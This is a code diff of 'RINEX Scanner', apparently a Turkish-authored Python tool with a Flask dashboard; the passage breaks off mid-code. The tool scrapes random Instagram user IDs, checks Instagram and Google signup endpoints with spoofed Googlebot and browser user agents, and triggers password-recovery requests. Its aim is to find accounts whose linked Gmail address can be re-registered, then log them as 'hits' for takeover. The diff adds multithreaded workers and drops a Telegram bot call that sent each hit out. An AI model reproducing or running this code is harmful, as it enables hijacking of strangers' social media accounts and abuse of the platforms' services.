@@ -3,9 +3,11 @@ from requests import get, post as pp
 from user_agent import generate_user_agent as _ua
 from random import choice as _ch, randrange as _rr
 import httpx
-from flask import Flask, render_template_string, send_file, jsonify, request
+from flask import Flask, render_template_string, send_file, jsonify, request, send_from_directory
 from datetime import datetime
 import html
+from queue import Queue
+import gc
 
 app_web = Flask(__name__)
 
@@ -18,11 +20,12 @@ C1 = "\033[1;97;40m"
 
 _CHARS = 'azertyuiopmlkjhgfdsqwxcvbn'
 
+# Basit HTML Template - Hızlı yüklensin
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>RINEX Instagram Scanner</title>
+    <title>RINEX Scanner</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -30,204 +33,122 @@ HTML_TEMPLATE = """
             background: #0a0a0a; 
             color: #00ff00; 
             font-family: 'Courier New', monospace;
-            padding: 20px;
-            min-height: 100vh;
+            padding: 10px;
         }
         .container {
-            max-width: 1200px;
+            max-width: 1000px;
             margin: 0 auto;
             background: #111;
             border: 1px solid #00ff00;
             border-radius: 10px;
-            padding: 20px;
-            box-shadow: 0 0 30px rgba(0,255,0,0.1);
+            padding: 15px;
         }
-        .header {
-            text-align: center;
-            border-bottom: 1px solid #00ff00;
-            padding-bottom: 20px;
-            margin-bottom: 20px;
-        }
-        .header h1 {
-            color: #ffd700;
-            text-shadow: 0 0 20px rgba(255,215,0,0.3);
-            font-size: 2.5em;
-        }
-        .header p {
-            color: #ff6b6b;
-            margin-top: 10px;
-        }
+        .header { text-align: center; border-bottom: 1px solid #00ff00; padding-bottom: 15px; margin-bottom: 15px; }
+        .header h1 { color: #ffd700; font-size: 2em; }
+        .header p { color: #ff6b6b; font-size: 0.9em; }
         .stats {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 15px;
-            margin: 20px 0;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 10px;
+            margin: 15px 0;
         }
         .stat-card {
             background: #1a1a1a;
             border: 1px solid #333;
-            border-radius: 8px;
-            padding: 15px;
-            text-align: center;
-        }
-        .stat-card .number {
-            font-size: 2em;
-            color: #00ff00;
-            font-weight: bold;
-        }
-        .stat-card .label {
-            color: #888;
-            font-size: 0.9em;
-            margin-top: 5px;
-        }
-        .hits-container {
-            margin: 20px 0;
-        }
-        .hit-item {
-            background: #1a1a1a;
-            border: 1px solid #333;
             border-radius: 5px;
             padding: 10px;
-            margin: 5px 0;
+            text-align: center;
+        }
+        .stat-card .number { font-size: 1.8em; color: #00ff00; font-weight: bold; }
+        .stat-card .label { color: #888; font-size: 0.8em; }
+        .controls {
             display: flex;
-            justify-content: space-between;
-            align-items: center;
-            transition: all 0.3s;
-        }
-        .hit-item:hover {
-            border-color: #00ff00;
-            background: #1f1f1f;
-        }
-        .hit-item .username {
-            color: #00ff00;
-            font-weight: bold;
-        }
-        .hit-item .year {
-            color: #ffd700;
-        }
-        .hit-item .email {
-            color: #4fc3f7;
+            gap: 10px;
+            margin: 15px 0;
+            flex-wrap: wrap;
+            justify-content: center;
         }
         .btn {
             background: #00ff00;
             color: #0a0a0a;
             border: none;
-            padding: 10px 20px;
+            padding: 8px 20px;
             border-radius: 5px;
             font-weight: bold;
             cursor: pointer;
-            transition: all 0.3s;
             text-decoration: none;
             display: inline-block;
-        }
-        .btn:hover {
-            background: #00cc00;
-            transform: scale(1.05);
-            box-shadow: 0 0 20px rgba(0,255,0,0.3);
-        }
-        .btn-download {
-            background: #ffd700;
-            color: #0a0a0a;
-            padding: 5px 15px;
             font-size: 0.9em;
         }
-        .btn-download:hover {
-            background: #ffcc00;
-        }
-        .live-feed {
-            max-height: 400px;
+        .btn:hover { background: #00cc00; transform: scale(1.02); }
+        .btn-download { background: #ffd700; }
+        .btn-download:hover { background: #ffcc00; }
+        .btn-hide { background: #ff4444; }
+        .btn-hide:hover { background: #cc0000; }
+        .hits-container {
+            margin: 15px 0;
+            max-height: 500px;
             overflow-y: auto;
             background: #0a0a0a;
             border: 1px solid #333;
             border-radius: 5px;
             padding: 10px;
         }
-        .live-feed::-webkit-scrollbar {
-            width: 8px;
-        }
-        .live-feed::-webkit-scrollbar-track {
+        .hits-container::-webkit-scrollbar { width: 6px; }
+        .hits-container::-webkit-scrollbar-track { background: #1a1a1a; }
+        .hits-container::-webkit-scrollbar-thumb { background: #00ff00; border-radius: 3px; }
+        .hit-item {
             background: #1a1a1a;
-        }
-        .live-feed::-webkit-scrollbar-thumb {
-            background: #00ff00;
-            border-radius: 4px;
-        }
-        .controls {
+            border: 1px solid #333;
+            border-radius: 3px;
+            padding: 8px;
+            margin: 3px 0;
             display: flex;
-            gap: 10px;
-            margin: 20px 0;
-            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 0.9em;
         }
-        .status-badge {
-            display: inline-block;
-            padding: 5px 15px;
-            border-radius: 20px;
-            font-size: 0.8em;
-            margin-left: 10px;
-        }
-        .status-running {
-            background: #00ff00;
-            color: #0a0a0a;
-        }
-        .status-stopped {
-            background: #ff0000;
-            color: #fff;
-        }
-        @media (max-width: 768px) {
-            .header h1 { font-size: 1.8em; }
+        .hit-item:hover { border-color: #00ff00; background: #1f1f1f; }
+        .hit-item .username { color: #00ff00; font-weight: bold; }
+        .hit-item .year { color: #ffd700; }
+        .hit-item .email { color: #4fc3f7; }
+        .hidden { display: none; }
+        #toggleBtn { margin: 10px 0; }
+        @media (max-width: 600px) {
             .stats { grid-template-columns: repeat(2, 1fr); }
-            .hit-item { flex-direction: column; align-items: flex-start; gap: 5px; }
+            .hit-item { flex-direction: column; align-items: flex-start; gap: 3px; font-size: 0.8em; }
+            .header h1 { font-size: 1.5em; }
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1>⚡ RINEX SCANNER ⚡</h1>
-            <p>BY RINEX @rinexdestek | @rinexsorgux</p>
-            <p>Status: <span class="status-badge status-running">🔴 LIVE</span></p>
+            <h1>⚡ RINEX SCANNER</h1>
+            <p>BY @rinexdestek | @rinexsorgux</p>
         </div>
 
         <div class="stats">
-            <div class="stat-card">
-                <div class="number">{{ stats.hits }}</div>
-                <div class="label">🎯 Total Hits</div>
-            </div>
-            <div class="stat-card">
-                <div class="number">{{ stats.checked }}</div>
-                <div class="label">🔍 Checked</div>
-            </div>
-            <div class="stat-card">
-                <div class="number">{{ stats.bad_email }}</div>
-                <div class="label">❌ Bad Email</div>
-            </div>
-            <div class="stat-card">
-                <div class="number">{{ stats.bad_instagram }}</div>
-                <div class="label">🚫 Bad Instagram</div>
-            </div>
+            <div class="stat-card"><div class="number" id="hits">0</div><div class="label">🎯 Hits</div></div>
+            <div class="stat-card"><div class="number" id="checked">0</div><div class="label">🔍 Checked</div></div>
+            <div class="stat-card"><div class="number" id="bad">0</div><div class="label">❌ Bad</div></div>
+            <div class="stat-card"><div class="number" id="total">0</div><div class="label">📊 Total</div></div>
         </div>
 
         <div class="controls">
-            <a href="/download/all" class="btn">📥 Download All Hits</a>
-            <a href="/download/txt" class="btn btn-download">📄 Download TXT</a>
+            <a href="/download/txt" class="btn btn-download">📥 Download TXT</a>
+            <a href="/download/all" class="btn">📊 HTML</a>
+            <button onclick="toggleHits()" class="btn btn-hide" id="toggleBtn">🙈 Hide Hits</button>
             <button onclick="refreshData()" class="btn">🔄 Refresh</button>
         </div>
 
-        <div class="hits-container">
-            <h2>🎯 Recent Hits</h2>
-            <div class="live-feed" id="hitsFeed">
+        <div id="hitsContainer">
+            <h3>📋 Recent Hits</h3>
+            <div class="hits-container" id="hitsFeed">
                 {% for hit in recent_hits %}
                 <div class="hit-item">
-                    <div>
-                        <span class="username">@{{ hit.username }}</span>
-                        <span class="email">{{ hit.email }}</span>
-                    </div>
-                    <div>
-                        <span class="year">📅 {{ hit.year }}</span>
-                        <span>👥 {{ hit.followers }}</span>
-                        <span>📝 {{ hit.posts }}</span>
-                        <a href="https://instagram.com/{{ hit.username }}" target="_blank" class="btn btn-download" style="margin-left:10px;">🔗</a>
-                    </div>
+                    <div><span class="username">@{{ hit.username }}</span> <span class="email">{{ hit.email }}</span></div>
+                    <div><span class="year">📅 {{ hit.year }}</span> 👥 {{ hit.followers }} <a href="https://instagram.com/{{ hit.username }}" target="_blank" style="color:#00ff00;">🔗</a></div>
                 </div>
                 {% endfor %}
             </div>
@@ -235,33 +156,33 @@ HTML_TEMPLATE = """
     </div>
 
     <script>
+        let hitsVisible = true;
+        function toggleHits() {
+            const container = document.getElementById('hitsContainer');
+            const btn = document.getElementById('toggleBtn');
+            if (hitsVisible) {
+                container.classList.add('hidden');
+                btn.textContent = '👁️ Show Hits';
+                btn.className = 'btn';
+            } else {
+                container.classList.remove('hidden');
+                btn.textContent = '🙈 Hide Hits';
+                btn.className = 'btn btn-hide';
+            }
+            hitsVisible = !hitsVisible;
+        }
+
         function refreshData() {
-            fetch('/api/hits')
-                .then(response => response.json())
+            fetch('/api/stats')
+                .then(r => r.json())
                 .then(data => {
-                    document.querySelectorAll('.stat-card .number')[0].textContent = data.hits;
-                    document.querySelectorAll('.stat-card .number')[1].textContent = data.checked;
-                    document.querySelectorAll('.stat-card .number')[2].textContent = data.bad_email;
-                    document.querySelectorAll('.stat-card .number')[3].textContent = data.bad_instagram;
-                    
-                    const feed = document.getElementById('hitsFeed');
-                    feed.innerHTML = data.hits_list.map(hit => `
-                        <div class="hit-item">
-                            <div>
-                                <span class="username">@${hit.username}</span>
-                                <span class="email">${hit.email}</span>
-                            </div>
-                            <div>
-                                <span class="year">📅 ${hit.year}</span>
-                                <span>👥 ${hit.followers}</span>
-                                <span>📝 ${hit.posts}</span>
-                                <a href="https://instagram.com/${hit.username}" target="_blank" class="btn btn-download" style="margin-left:10px;">🔗</a>
-                            </div>
-                        </div>
-                    `).join('');
+                    document.getElementById('hits').textContent = data.hits;
+                    document.getElementById('checked').textContent = data.checked;
+                    document.getElementById('bad').textContent = data.bad;
+                    document.getElementById('total').textContent = data.total;
                 });
         }
-        setInterval(refreshData, 10000);
+        setInterval(refreshData, 5000);
     </script>
 </body>
 </html>
@@ -282,8 +203,17 @@ class _Core:
         self._tls_file = "_dabb_tls.dat"
         self._hits_file = "_dabb_hits.log"
         self._db_file = "hits.db"
-        self._init_db()
+        self._queue = Queue(maxsize=1000)
         self._running = True
+        self._init_db()
+        self._hit_count = 0
+        
+        # Worker thread'ler
+        self._workers = []
+        for i in range(10):
+            w = threading.Thread(target=self._worker, daemon=True)
+            w.start()
+            self._workers.append(w)
     
     def _init_db(self):
         conn = sqlite3.connect(self._db_file)
@@ -309,12 +239,12 @@ class _Core:
                       (username, email, year, followers, posts, reset_link))
             conn.commit()
             conn.close()
+            self._hit_count += 1
             return True
-        except Exception as e:
-            print(f"DB Error: {e}")
+        except:
             return False
     
-    def _get_recent_hits(self, limit=50):
+    def _get_recent_hits(self, limit=100):
         try:
             conn = sqlite3.connect(self._db_file)
             c = conn.cursor()
@@ -330,12 +260,20 @@ class _Core:
         try:
             conn = sqlite3.connect(self._db_file)
             c = conn.cursor()
-            c.execute('SELECT username, email, year, followers, posts, reset_link FROM hits')
+            c.execute('SELECT username, email, year, followers, posts, reset_link FROM hits ORDER BY timestamp DESC')
             rows = c.fetchall()
             conn.close()
             return rows
         except:
             return []
+    
+    def _get_stats(self):
+        return {
+            'hits': self._H,
+            'checked': self._C,
+            'bad': self._BE + self._BI,
+            'total': self._H + self._BE + self._BI
+        }
     
     def _clear(self):
         os.system('clear' if os.name == 'posix' else 'cls')
@@ -349,10 +287,9 @@ class _Core:
    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
 """)
         print(f'''{YELLOW}
-        
 ╔═════════════════════════════════
 ║{GREEN}BY RİNEX @rinexdestek {YELLOW} 
-║{RED}RİNEX 2026 İNSTA TOOL @rinexsorgux {RED}
+║{RED}RİNEX 2026 İNSTA TOOL {RED}
 ║  {YELLOW} ★BY RİNEX {GREEN}                       
 ╚════════════════════════════════
 ''')
@@ -414,8 +351,7 @@ class _Core:
             with open(self._tls_file,'a') as f:
                 f.write(tl+'//'+b1+'\n')
             return True
-        except Exception as e:
-            print(f"Token fetch error: {e}")
+        except:
             return False
     
     def _droid_ua(self):
@@ -447,38 +383,28 @@ class _Core:
                 'Accept-Language': 'en-US,en;q=0.9',
                 'Accept-Encoding': 'gzip, deflate, br',
                 'Connection': 'keep-alive',
-                'Upgrade-Insecure-Requests': '1',
-                'Sec-Fetch-Dest': 'document',
-                'Sec-Fetch-Mode': 'navigate',
-                'Sec-Fetch-Site': 'none',
-                'Sec-Fetch-User': '?1',
-                'Cache-Control': 'max-age=0',
+                'Cache-Control': 'no-cache',
                 'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
                 'sec-ch-ua-mobile': '?1',
                 'sec-ch-ua-platform': '"Android"',
             }
-            
-            session = httpx.Client(timeout=15, follow_redirects=True)
+            session = httpx.Client(timeout=10, follow_redirects=True)
             session.headers.update(headers)
-            session.get('https://www.instagram.com/')
-            
             r = session.post(
                 "https://i.instagram.com/api/v1/users/check_email/",
                 data=f"email={e}",
             )
-            
             if 'email_is_taken' in r.text:
-                return "good_instagram"
-            return "bad_instagram"
-        except Exception as e:
-            return "error"
+                return True
+            return False
+        except:
+            return False
     
     def _get_reset(self, u):
         try:
             ua = self._droid_ua()
             ig_did = str(uuid.uuid4()).upper()
             mid = base64.b64encode(uuid.uuid4().bytes).decode()[:32]
-            
             h = {
                 "User-Agent": ua,
                 "Accept": "*/*",
@@ -498,15 +424,9 @@ class _Core:
                 "sec-ch-ua": '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
                 "sec-ch-ua-mobile": "?1",
                 "sec-ch-ua-platform": '"Android"',
-                "sec-fetch-dest": "empty",
-                "sec-fetch-mode": "cors",
-                "sec-fetch-site": "same-origin",
             }
-            
-            session = httpx.Client(timeout=20, follow_redirects=True)
+            session = httpx.Client(timeout=15, follow_redirects=True)
             session.headers.update(h)
-            session.get('https://www.instagram.com/')
-            
             r = session.post(
                 "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/",
                 data={"email_or_username":u},
@@ -529,9 +449,7 @@ class _Core:
             cl = rp.replace('*','').replace('•','').replace('…','').replace('.','')
             if len(cl) < 1 or len(u) < 1:
                 return True
-            fm = cl[0].lower() == u[0].lower()
-            lm = cl[-1].lower() == u[-1].lower() if len(cl) >= 2 else True
-            return fm and lm
+            return cl[0].lower() == u[0].lower()
         except:
             return True
     
@@ -559,36 +477,21 @@ class _Core:
     def _send_hit(self, u, d, re, ry, f, p):
         self._H += 1
         email = f"{u}@{d}"
-        msg = f"""BY RİNEX ⚡
-━━━━━━━━━━━━━━━
-👤 @{u}
-📧 {email}
-📅 YÎL TARİH: {ry}
-👥 takipçi: {f}
-📝 Post: {p}
-🔑 HESAP LİNK: {re}
-━━━━━━━━━━━━━━━
-🔗 instagram.com/{u}
-👀rinexdestek """
         
+        # Direkt DB'ye kaydet
         self._save_hit_to_db(u, email, str(ry), f, p, re)
         
+        # TXT'ye de kaydet
         try:
             with open(self._hits_file,'a',encoding='utf-8') as fh:
                 fh.write(f"@{u} | {email} | {ry} | {re}\n")
         except: pass
         
-        if self._token and self._cid:
-            try:
-                requests.post(f"https://api.telegram.org/bot{self._token}/sendMessage",
-                              json={'chat_id':self._cid,'text':msg}, timeout=10)
-            except: pass
-        
         print(f"{GREEN}[HIT]{RESET} @{u} | Year: {ry} | Followers: {f}")
     
     def _val_gml(self, e):
         if '@' in e: e = str(e).split('@')[0]
-        for _ in range(3):
+        for _ in range(2):
             try:
                 try:
                     _x = open(self._tls_file,'r').read().splitlines()[0]
@@ -597,7 +500,6 @@ class _Core:
                     _x = open(self._tls_file,'r').read().splitlines()[0]
                 _tl, _h = _x.split('//')
                 c = {'__Host-GAPS':_h}
-                
                 googlebot_ua = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
                 h = {
                     'authority': 'accounts.google.com',
@@ -609,78 +511,69 @@ class _Core:
                     'user-agent': googlebot_ua,
                     'Accept-Encoding': 'gzip, deflate, br',
                     'Cache-Control': 'no-cache',
-                    'Pragma': 'no-cache',
                     'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
-                    'sec-ch-ua-mobile': '?0',
-                    'sec-ch-ua-platform': '"Windows"',
-                    'sec-fetch-dest': 'empty',
-                    'sec-fetch-mode': 'cors',
-                    'sec-fetch-site': 'same-origin',
                 }
                 p = {'TL':_tl}
-                d = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+_tl+'%22%2C%22'+e+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
-                
+                d = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+_tl+'%22%2C%22'+e+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&flowName=GlifWebSignIn&'
                 session = requests.Session()
                 session.headers.update(h)
                 session.cookies.update(c)
-                r = session.post('https://accounts.google.com/_/signup/usernameavailability', params=p, data=d, timeout=10)
+                r = session.post('https://accounts.google.com/_/signup/usernameavailability', params=p, data=d, timeout=8)
                 if '"gf.uar",1' in str(r.text):
-                    return 'good'
+                    return True
                 elif '"er",null,null,null,null,400' in str(r.text):
                     self._fetch_tokens()
                     continue
                 else:
-                    return 'bad'
+                    return False
             except:
                 self._fetch_tokens()
-        return 'bad'
+        return False
     
-    def _hit_process(self, e, ud=None):
-        try:
-            gml = self._val_gml(e)
-            if gml == 'good':
-                u, d = e.split('@')
-                re = self._get_reset(u)
-                if not self._smart_match(u, re):
-                    self._BE += 1
-                    return
-                f = 0
-                p = 0
-                ry = 'N/A'
-                if ud:
-                    f = ud.get('follower_count',0)
-                    p = ud.get('media_count',0)
-                    uid = str(ud.get('id', ud.get('pk','')))
-                    ry = self._yr_from_id(uid)
-                self._send_hit(u, d, re, ry, f, p)
-            else:
-                self._BE += 1
-        except:
-            self._BE += 1
-    
-    def _process(self, e, ud=None):
-        self._C += 1
-        try:
-            v = self._val_ig(e)
-            if v == "good_instagram":
-                self._hit_process(e, ud)
-            else:
-                self._BI += 1
-        except:
-            self._BI += 1
-    
-    def _scan_loop(self):
+    def _worker(self):
+        """Worker thread - queue'dan iş alır"""
         while self._running:
             try:
-                rnd = str(random.randint(150,999))
+                item = self._queue.get(timeout=1)
+                if item is None:
+                    continue
+                e, ud = item
+                self._C += 1
+                try:
+                    if self._val_ig(e):
+                        gml = self._val_gml(e)
+                        if gml:
+                            u, d = e.split('@')
+                            re = self._get_reset(u)
+                            if self._smart_match(u, re):
+                                f = ud.get('follower_count',0) if ud else 0
+                                p = ud.get('media_count',0) if ud else 0
+                                ry = 'N/A'
+                                if ud:
+                                    uid = str(ud.get('id', ud.get('pk','')))
+                                    ry = self._yr_from_id(uid)
+                                self._send_hit(u, d, re, ry, f, p)
+                            else:
+                                self._BE += 1
+                        else:
+                            self._BE += 1
+                    else:
+                        self._BI += 1
+                except:
+                    self._BI += 1
+                self._queue.task_done()
+            except:
+                continue
+    
+    def _scan_loop(self):
+        """Scanner - sürekli user ID'leri çeker"""
+        while self._running:
+            try:
                 ua_list = [
                     "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
-                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
-                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-                    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
-                    "Instagram 311.0.0.32.118 Android (23/6.0; 420dpi; 1080x2280; SAMSUNG; SM-G973F; beyond1; qcom; en_US; 545986123)"
+                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
+                    "Instagram 311.0.0.32.118 Android (23/6.0; 420dpi; 1080x2280; SAMSUNG; SM-G973F)"
                 ]
                 ua = random.choice(ua_list)
                 
@@ -691,28 +584,20 @@ class _Core:
                     Id = str(_rr(2500000000, 8597939245))
                 
                 lsd = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
-                
                 headers = {
                     'accept': '*/*',
                     'accept-language': 'en,en-US;q=0.9',
                     'content-type': 'application/x-www-form-urlencoded',
                     'dnt': '1',
                     'origin': 'https://www.instagram.com',
-                    'priority': 'u=1, i',
-                    'referer': 'https://www.instagram.com/cristiano/following/',
+                    'referer': 'https://www.instagram.com/',
                     'user-agent': ua,
                     'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query',
                     'x-fb-lsd': lsd,
                     'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
-                    'sec-ch-ua-mobile': '?0',
-                    'sec-ch-ua-platform': '"Windows"',
-                    'sec-fetch-dest': 'empty',
-                    'sec-fetch-mode': 'cors',
-                    'sec-fetch-site': 'same-origin',
                     'Accept-Encoding': 'gzip, deflate, br',
                     'Cache-Control': 'no-cache',
                 }
-                
                 d = {
                     'lsd': lsd,
                     'fb_api_caller_class': 'RelayModern',
@@ -724,7 +609,7 @@ class _Core:
                 
                 session = requests.Session()
                 session.headers.update(headers)
-                r = session.post('https://www.instagram.com/api/graphql', data=d, timeout=10)
+                r = session.post('https://www.instagram.com/api/graphql', data=d, timeout=8)
                 
                 try:
                     j = r.json()
@@ -742,11 +627,13 @@ class _Core:
                     continue
                 
                 self._found.add(u)
-                self._cache[u] = ud
                 email = u + '@gmail.com'
-                self._process(email, ud)
                 
-            except Exception as e:
+                # Queue'ya ekle
+                if self._queue.qsize() < 900:
+                    self._queue.put((email, ud))
+                
+            except:
                 continue
     
     def _stats_loop(self):
@@ -754,46 +641,46 @@ class _Core:
             self._clear()
             self._banner()
             yr = f"{CYAN}{self._yr_val}" if self._yr_val else "ALL"
+            qsize = self._queue.qsize()
             tt = f"""
- ╔════════════════════════════════════╗
- ║  {YELLOW} BY RİNEX LIVE STATS ⚡{C1}    ║
- ╠════════════════════════════════════╣
- ║  🎯 Hit HESAP         : {RED}{self._H}{C1}
- ║  🔍 checklendi     : {YELLOW}{self._C}{C1}
- ║  ❌ BAD HESAP    : {RED}{self._BE}{C1}
- ║  🚫 Bad Instagram  : {YELLOW}{self._BI}{C1}
- ║  📅 YİL TARİH : {yr}{C1}
- ╠════════════════════════════════════╣
- ║  👨‍@rinexdestek | ⛓️ @rinexsorgux   ║
- ╚════════════════════════════════════╝
+ ╔══════════════════════════════════════════════╗
+ ║  {YELLOW} BY RİNEX LIVE STATS ⚡{C1}              ║
+ ╠══════════════════════════════════════════════╣
+ ║  🎯 Hits         : {RED}{self._H}{C1}
+ ║  🔍 Checked      : {YELLOW}{self._C}{C1}
+ ║  ❌ Bad Email    : {RED}{self._BE}{C1}
+ ║  🚫 Bad IG      : {YELLOW}{self._BI}{C1}
+ ║  📦 Queue        : {CYAN}{qsize}{C1}
+ ║  📅 Year        : {yr}{C1}
+ ╠══════════════════════════════════════════════╣
+ ║  👨 @rinexdestek | ⛓️ @rinexsorgux           ║
+ ╚══════════════════════════════════════════════╝
 """
             print(tt)
-            t.sleep(3)
+            t.sleep(2)
     
     def run(self):
         self._banner()
-        print(f"{GREEN}[+] Bot başlatılıyor...{RESET}")
-        print(f"{GREEN}[+] Token: {'Var' if self._token else 'Yok'}{RESET}")
-        print(f"{GREEN}[+] Chat ID: {'Var' if self._cid else 'Yok'}{RESET}")
-        
+        print(f"{GREEN}[+] Başlatılıyor...{RESET}")
         self._fetch_tokens()
         
-        # Yıl seçimi - default ALL
         self._yr_range = None
         self._yr_val = None
         
         print(f"{GREEN}[+] Tüm yıllar taranıyor...{RESET}")
-        t.sleep(1)
         
-        # Web sunucusunu başlat
+        # Web sunucusu
         threading.Thread(target=self._start_web_server, daemon=True).start()
         
-        # Scanner thread'leri başlat
+        # Stats
         threading.Thread(target=self._stats_loop, daemon=True).start()
-        for _ in range(100):
+        
+        # Scanner thread'ler (50 tane)
+        for _ in range(50):
             threading.Thread(target=self._scan_loop, daemon=True).start()
         
-        print(f"{GREEN}[+] Web interface: http://0.0.0.0:{os.environ.get('PORT', 5000)}{RESET}")
+        print(f"{GREEN}[+] Web: http://0.0.0.0:{os.environ.get('PORT', 5000)}{RESET}")
+        print(f"{GREEN}[+] Hit göster butonuna basabilirsin{RESET}")
         
         while True:
             t.sleep(10)
@@ -805,14 +692,7 @@ class _Core:
 # Flask routes
 @app_web.route('/')
 def index():
-    hits = app._get_recent_hits(50)
-    stats = {
-        'hits': app._H,
-        'checked': app._C,
-        'bad_email': app._BE,
-        'bad_instagram': app._BI
-    }
-    
+    hits = app._get_recent_hits(100)
     recent_hits = []
     for hit in hits:
         recent_hits.append({
@@ -823,12 +703,15 @@ def index():
             'posts': hit[4],
             'reset_link': hit[5]
         })
-    
-    return render_template_string(HTML_TEMPLATE, stats=stats, recent_hits=recent_hits)
+    return render_template_string(HTML_TEMPLATE, recent_hits=recent_hits)
+
+@app_web.route('/api/stats')
+def api_stats():
+    return jsonify(app._get_stats())
 
 @app_web.route('/api/hits')
 def api_hits():
-    hits = app._get_recent_hits(50)
+    hits = app._get_recent_hits(200)
     hits_list = []
     for hit in hits:
         hits_list.append({
@@ -836,74 +719,36 @@ def api_hits():
             'email': hit[1],
             'year': hit[2],
             'followers': hit[3],
-            'posts': hit[4],
-            'reset_link': hit[5]
+            'posts': hit[4]
         })
-    
-    return jsonify({
-        'hits': app._H,
-        'checked': app._C,
-        'bad_email': app._BE,
-        'bad_instagram': app._BI,
-        'hits_list': hits_list
-    })
-
-@app_web.route('/download/all')
-def download_all():
-    hits = app._get_all_hits()
-    html_content = """
-    <!DOCTYPE html>
-    <html>
-    <head><title>All Hits - RINEX Scanner</title>
-    <style>
-        body { font-family: monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }
-        table { width: 100%; border-collapse: collapse; }
-        th, td { border: 1px solid #333; padding: 10px; text-align: left; }
-        th { background: #1a1a1a; color: #ffd700; }
-        td { background: #111; }
-        tr:hover td { background: #1a1a1a; }
-        a { color: #00ff00; }
-    </style>
-    </head>
-    <body>
-        <h1>🎯 All Hits - RINEX Scanner</h1>
-        <p>Total: {} hits</p>
-        <table>
-            <tr><th>#</th><th>Username</th><th>Email</th><th>Year</th><th>Followers</th><th>Posts</th><th>Reset Link</th></tr>
-    """.format(len(hits))
-    
-    for i, hit in enumerate(hits, 1):
-        html_content += f"""
-            <tr>
-                <td>{i}</td>
-                <td><a href="https://instagram.com/{hit[0]}" target="_blank">@{hit[0]}</a></td>
-                <td>{hit[1]}</td>
-                <td>{hit[2]}</td>
-                <td>{hit[3]}</td>
-                <td>{hit[4]}</td>
-                <td><a href="{hit[5]}" target="_blank">Link</a></td>
-            </tr>
-        """
-    
-    html_content += "</table></body></html>"
-    return html_content
+    return jsonify({'hits': hits_list, 'total': len(hits_list)})
 
 @app_web.route('/download/txt')
 def download_txt():
     hits = app._get_all_hits()
-    content = "RINEX SCANNER - ALL HITS\n"
-    content += "=" * 50 + "\n"
-    content += f"Total Hits: {len(hits)}\n"
-    content += "=" * 50 + "\n\n"
-    
+    content = "RINEX HITS\n" + "="*40 + "\n"
+    content += f"Total: {len(hits)}\n\n"
     for hit in hits:
-        content += f"@{hit[0]} | {hit[1]} | {hit[2]} | Followers: {hit[3]} | Posts: {hit[4]}\n"
+        content += f"@{hit[0]} | {hit[1]} | {hit[2]} | {hit[3]}\n"
     
-    filename = f"rinex_hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+    filename = f"hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
     with open(filename, 'w', encoding='utf-8') as f:
         f.write(content)
-    
     return send_file(filename, as_attachment=True)
+
+@app_web.route('/download/all')
+def download_all():
+    hits = app._get_all_hits()
+    html = """<!DOCTYPE html><html><head><title>Hits</title>
+    <style>body{background:#0a0a0a;color:#00ff00;font-family:monospace;padding:20px}
+    table{width:100%;border-collapse:collapse}
